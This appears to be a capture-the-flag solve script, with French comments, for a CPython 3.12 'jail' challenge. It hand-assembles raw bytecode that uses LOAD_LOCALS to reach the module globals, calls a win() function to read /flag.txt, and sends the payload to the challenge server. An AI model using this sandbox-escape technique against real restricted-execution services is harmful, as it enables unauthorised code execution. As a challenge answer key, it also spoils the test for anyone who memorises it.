#!/usr/bin/env python3
# Low-Level-Python (Pwny-CTF, Jail, CPython 3.12.3)
#
# On fournit le BYTECODE BRUT d'un code object dont le challenge fige :
#   co_consts=(), co_names=(), co_varnames=(), nlocals=0, STACKSIZE=0, exctable=b""
#   eval(CodeType(0,0,0,0,0,0, bytecode, (),(),(),"","","",0, b"", b""))
# But : lire /flag.txt via win() (print(open("/flag.txt").read())), presente dans
# les globals du module.
#
# Contraintes :
#  - co_consts/names/varnames vides -> pas de LOAD_CONST/LOAD_GLOBAL/LOAD_FAST par nom.
#    Opcode salvateur : LOAD_LOCALS, qui AU NIVEAU MODULE pousse le dict des GLOBALS
#    (il contient win).
#  - exctable = b"" (impose) -> AUCUN try/except possible : il ne faut lever aucune
#    exception. Donc interdit d'appeler les valeurs non-appelables -> on appelle
#    UNIQUEMENT win. Or dans chal.py win est l'avant-derniere valeur des globals
#    (definie juste avant `bytecode`), donc win == list(globals().values())[-2].
#  - co_stacksize=0 -> empiler ecrit hors de la pile allouee ; TOLERE tant qu'on ne
#    fait pas d'appel Python qui pose sa frame par-dessus. Comme on ne fait qu'UN
#    seul CALL (win) et qu'on ne reutilise pas la pile apres (RETURN_VALUE direct),
#    aucune corruption : win imprime le flag et l'eval se termine.
#
# Bytecode assemble (equivalent Python) :
#   L = []
#   for k in LOCALS:            # LOCALS = globals du module
#       L.append(LOCALS[k])     # aucune exception (subscript d'une cle existante)
#   return L[-2]()              # -2 = -(True+True) ; L[-2] = win ; on l'appelle
#
# Detail des opcodes dans build_bytecode() ci-dessous (a executer SOUS 3.12 pour
# regenerer le hex ; ici on envoie le hex deja verifie pour 3.12.3).

from pwn import *

# Bytecode verifie pour CPython 3.12.3 (voir build_bytecode()).
BYTECODE_HEX = ("97006700570044005d060000570063021900000091028c08"
                "0400570057006b28000078017a0000000b00190000000200"
                "6302ab000000000000005300")

def build_bytecode():
    """Regenere le hex ci-dessus. A LANCER SOUS PYTHON 3.12 (opcodes = version du runtime)."""
    import dis
    CACHE = dis._inline_cache_entries
    osz = lambda n: 2 + 2 * CACHE[dis.opmap[n]]
    def oparg_of(src, op):
        for i in dis.get_instructions(compile(src, "", "exec")):
            if i.opname == op:
                return i.arg
    CMP = oparg_of("a==b", "COMPARE_OP")     # ==
    ADD = oparg_of("a+b", "BINARY_OP")       # +  (NB_ADD)
    LA  = oparg_of("[x for x in y]", "LIST_APPEND")
    prog = [
        ("RESUME", 0), ("BUILD_LIST", 0), ("LOAD_LOCALS", 0), ("GET_ITER", 0), "FOR",
        ("FOR_ITER", "POST"), ("LOAD_LOCALS", 0), ("SWAP", 2), ("BINARY_SUBSCR", 0),
        ("LIST_APPEND", LA), ("JUMP_BACKWARD", "FOR"), "POST",
        ("END_FOR", 0), ("LOAD_LOCALS", 0), ("LOAD_LOCALS", 0), ("COMPARE_OP", CMP),
        ("COPY", 1), ("BINARY_OP", ADD), ("UNARY_NEGATIVE", 0), ("BINARY_SUBSCR", 0),
        ("PUSH_NULL", 0), ("SWAP", 2), ("CALL", 0), ("RETURN_VALUE", 0),
    ]
    off = {}; pos = 0
    for it in prog:
        if isinstance(it, str): off[it] = pos
        else: pos += osz(it[0])
    code = bytearray()
    for it in prog:
        if isinstance(it, str): continue
        n, a = it; nc = CACHE[dis.opmap[n]]; nxt = len(code) + 2 + 2 * nc
        if isinstance(a, str):
            a = (nxt - off[a]) // 2 if n == "JUMP_BACKWARD" else (off[a] - nxt) // 2
        code += bytes([dis.opmap[n], a]) + bytes(2 * nc)
    return bytes(code).hex()

io = remote("chal.sigpwny.com", 7006)
io.sendlineafter(b"(in hex): ", BYTECODE_HEX.encode())
print(io.recvall(timeout=6).decode(errors="replace"))
